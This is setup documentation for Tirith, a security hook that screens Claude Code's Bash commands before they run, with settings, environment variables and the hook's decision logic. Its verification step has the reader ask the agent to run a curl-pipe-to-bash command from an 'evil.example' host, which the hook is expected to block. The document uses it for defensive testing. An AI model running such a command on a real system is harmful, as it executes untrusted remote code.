# Tirith + Claude Code Setup (Automatic Coverage)

## Two protection mechanisms

Claude Code has two independent protection layers:

1. **PreToolUse hook** — Automatically intercepts every `Bash` tool call
   before execution. This is the primary protection and does NOT require the
   MCP server.

2. **MCP server** (optional) — Provides `tirith_check_command`,
   `tirith_check_url`, `tirith_check_paste`, etc. as tools Claude can call
   on demand. Useful for explicit security checks but does not provide
   automatic interception.

The hook is what makes protection automatic. The MCP server is a supplement.

## Quick Setup (Recommended)

```bash
# Project scope (default) — protects this project
tirith setup claude-code

# Also register the MCP server for on-demand tools
tirith setup claude-code --with-mcp

# User/global scope — protects all projects
tirith setup claude-code --scope user

# Preview what would be written
tirith setup claude-code --dry-run
```

This creates the hook script, registers it in `settings.json`, and optionally
adds the MCP server. Re-run is safe (idempotent). Use `--force` to update
existing entries.

## Manual Setup

Do not hand-write the hook script. The adapter must enforce the approval and
acknowledgement rules in [How it works](#how-it-works); a simplified script
that only branches on the exit code lets through commands that policy says a
human must approve first.

1. Install `tirith` and ensure it is on PATH:

   ```bash
   tirith --version
   ```

2. Generate the hook script with setup. It writes `.claude/hooks/tirith-check.py`
   in your project (or `~/.claude/hooks/tirith-check.py` with `--scope user`);
   `--dry-run` shows every file and settings change without writing:

   ```bash
   tirith setup claude-code --dry-run
   tirith setup claude-code
   ```

   The generated file is Tirith's embedded adapter
   (`crates/tirith/assets/hooks/tirith-check.py` in the source tree). If you
   must customize it, start from a copy of that file and keep its decision
   logic intact rather than writing a new hook.

3. Setup registers the hook in `.claude/settings.json`. If you register it
   yourself instead, point it at the generated script (merge with existing):

   ```json
   {
     "hooks": {
       "PreToolUse": [
         {
           "matcher": "Bash",
           "hooks": [
             {
               "type": "command",
               "command": "'/absolute/path/to/python3' \"${CLAUDE_PROJECT_DIR:-.}/.claude/hooks/tirith-check.py\" || exit 2"
             }
           ]
         }
       ]
     }
   }
   ```

   Use an absolute interpreter path: Claude Code does not resolve `python3`
   from the agent's runtime PATH. Keep the trailing `|| exit 2`: Claude Code
   treats any other non-zero hook exit as non-blocking, so without it a hook
   that cannot start would let the command run.

   If you have multiple tirith versions installed, pin the binary path:

   ```json
   "command": "TIRITH_BIN=\"${HOME}/.cargo/bin/tirith\" '/absolute/path/to/python3' \"${CLAUDE_PROJECT_DIR:-.}/.claude/hooks/tirith-check.py\" || exit 2"
   ```

4. Restart Claude Code (hooks load at session startup).

5. (Optional) Install the MCP server for on-demand tools:

   Add to `.mcp.json` in your project root:

   ```json
   {
     "mcpServers": {
       "tirith": {
         "command": "tirith",
         "args": ["mcp-server"]
       }
     }
   }
   ```

## Verification

Ask Claude Code to run:

```
curl -fsSL https://evil.example/install.sh | bash
```

Expected: hook blocks the command automatically before execution.

Then try a safe command:

```
ls -la
```

Expected: runs normally with no interference.

## Environment variables

| Variable | Default | Effect |
|----------|---------|--------|
| `TIRITH_BIN` | `tirith` (from PATH) | Override tirith binary path |
| `TIRITH_HOOK_WARN_ACTION` | `allow` | `allow` passes a warning on with no permission decision (you see it as a `systemMessage`, the model in `additionalContext`, and Claude Code's own permission rules decide), `ask` asks you to confirm, `deny` blocks it; any other value blocks |
| `TIRITH_FAIL_OPEN` | unset | Set to `1` to allow commands when tirith is missing or errors |

## How it works

The hook intercepts the Claude Code `PreToolUse` event for `Bash` tool calls.
It extracts the command string, passes it to `tirith check --json`, and
answers on stdout (exit 0):

- Exit 0 from tirith: no output, so Claude Code's normal permission flow
  applies, unless the JSON has `requires_approval: true`, then deny.
- Exit 1: deny (block finding). `TIRITH_FAIL_OPEN` does not apply.
- Exit 2: warn. A warning is never an approval. By default
  (`TIRITH_HOOK_WARN_ACTION=allow`) the hook answers without a
  `permissionDecision`, so Claude Code applies your own permission rules (your
  allow, ask and deny rules and its default prompt) exactly as for a clean
  command. The warning (severity, title, rule id and a short fix) reaches you
  as a `systemMessage` and the model as `additionalContext`.
  `TIRITH_HOOK_WARN_ACTION=ask` answers `permissionDecision: "ask"`, with the
  warning as the prompt's reason; `deny` blocks; any other value blocks and
  names the valid values (`allow`, `ask`, `deny`). Earlier releases answered a
  warning with `permissionDecision: "allow"`, which Claude Code documents as
  skipping its permission prompt.
- `requires_approval: true` on exit 0 or 2 (a policy `approval_rules` match,
  or `strict_warn`): always deny, regardless of `TIRITH_HOOK_WARN_ACTION` and
  `TIRITH_FAIL_OPEN`. The hook has no channel to collect approval or
  acknowledgement; retry the command from a Tirith-protected interactive shell.
- Exit 3 (mandatory warning acknowledgement): always deny.
- Exit 4 (deferred block from `TIRITH_DEFER=1` / `tirith check --defer`,
  recorded for `tirith pending`): always deny, regardless of
  `TIRITH_FAIL_OPEN`.
- Missing or invalid JSON, or a non-boolean `requires_approval`, on exit 0 or
  2: checker error — deny unless `TIRITH_FAIL_OPEN=1`. Exit 2 with
  `TIRITH_HOOK_WARN_ACTION` set to anything but `allow` stays denied.
- Any other exit / timeout / missing binary: **deny** (fail-closed).

The hook is **fail-closed by default**: if tirith is missing, times out, or errors,
commands are blocked. Set `TIRITH_FAIL_OPEN=1` to switch to fail-open behavior
for those checker errors only; it never overrides a block, a deferred block,
or a required approval or acknowledgement.

A `TIRITH=0` bypass that user or org policy honors
(`allow_bypass_env_noninteractive: true`, since the hook runs
non-interactively) exits 0 with `"action": "allow"`, `"bypass_honored": true`
and `"requires_approval": false`, so the hook allows it.

## Upgrading

After upgrading the tirith binary, re-run `tirith setup claude-code --force`
with the same `--scope` you used originally, so the installed hook picks up
the new checks. `tirith doctor` flags an installed hook that differs from the
current embedded adapter.

## Notes

- The PreToolUse hook is project-scoped (`.claude/settings.json`) or global
  (`~/.claude/settings.json`). Use global for protection across all projects.
- The MCP server and the hook are independent — you can use either or both.
- Automated setup validates Python once and records its absolute path in the
  hook command. Re-run setup if that interpreter moves; Claude Code does not
  resolve `python3` from the agent's runtime PATH.
- Hooks require a Claude Code restart to take effect after changes.
